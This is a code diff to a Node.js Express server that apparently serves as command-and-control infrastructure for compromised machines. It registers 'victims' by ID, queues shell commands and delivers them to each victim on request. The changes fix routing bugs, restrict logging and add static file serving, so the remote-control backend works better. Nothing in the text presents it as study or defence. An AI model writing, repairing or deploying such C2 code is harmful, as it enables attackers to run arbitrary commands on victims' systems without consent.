@@ -2,8 +2,6 @@ const express = require('express');
 const bodyparser = require('body-parser');
 const victimDB = require('./victimdb');
 
-console.log(victimDB);
-
 const PORT = process.env.PORT || 5000;
 app = express();
 bodyparser.set
@@ -12,8 +10,9 @@ app.listen(PORT);
 
 const defaultCommand = "echo hello";
 
-app.get("registervictim/:victimID", (req, res) => {
-  victimDB.addVictim(victimID);
+app.get("/registervictim/:victimID", (req, res) => {
+  victimDB.addVictim(req.params.victimID);
+  res.send("");
 })
 
 app.get("/command(/:victimID)?",(req, res) =>{
@@ -21,8 +20,10 @@ app.get("/command(/:victimID)?",(req, res) =>{
   if (victimID) victimDB.addVictim(victimID);
   let target = victimDB.getVictim(victimID);
   let command = target ? (victimDB.getNextCommand(target) || defaultCommand) : defaultCommand;
-  console.log("Sending command: ", command);
-  console.log("To victim: ", req.params.victimID);
+  if (command != defaultCommand) {
+    console.log("Sending command: ", command);
+    console.log("To victim: ", target);
+  }
   res.send(command);
 });
 
@@ -42,3 +43,5 @@ app.post("/sendcommand", (req, res) => {
 app.get("/victimcount", (req, res) => {
   res.send(""+victimDB.getVictimCount());
 });
+
+app.use(express.static(__dirname + '/public/'));
